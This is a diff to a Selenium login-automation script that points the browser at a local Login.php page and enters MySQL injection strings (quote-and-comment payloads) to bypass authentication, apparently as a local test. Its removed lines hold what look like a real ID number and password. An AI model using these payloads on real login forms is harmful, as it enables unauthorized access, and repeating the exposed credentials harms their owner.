@@ -11,6 +11,7 @@ driver = webdriver.Chrome()
 #driver.get('https://moodle2023.ruppin.ac.il/login/index.php')
 #driver.get('https://www.facebook.com/')
 #driver.get('https://www.instagram.com/')
+driver.get('http://localhost:8000/Login.php')
 
 # Wait for the page to load (you can use other wait strategies too)
 time.sleep(2)
@@ -20,8 +21,13 @@ input_elements = driver.find_elements(By.TAG_NAME, "input")  # Replace 'input_fi
 input_elements = [element for element in input_elements if element.is_displayed()]
 #for element in input_elements:
 #    print(f'{element.get_property("name")}')
-input_elements[0].send_keys('211819693')
-input_elements[1].send_keys('wig2psr')
+# ------ mysql ------
+input_elements[0].send_keys('a@a.a\'/*')
+input_elements[1].send_keys('\'*/\'')
+
+# another option
+# input_elements[0].send_keys('a@a.a\'-- ')
+# ------ end mysql ------
 
 # input_field2 = driver.find_element(By.TAG_NAME, 'input')  # Replace 'input_field2_name' with the actual name of the input field
 # input_field2.send_keys('wig2psr')
@@ -48,7 +54,7 @@ print(len(button_elements))
 # print(button_elements[0].get_attribute("id"))
 button_elements[-1].click()
 
-time.sleep(2)
+time.sleep(10)
 print(driver.current_url)
 
 # Close the browser window
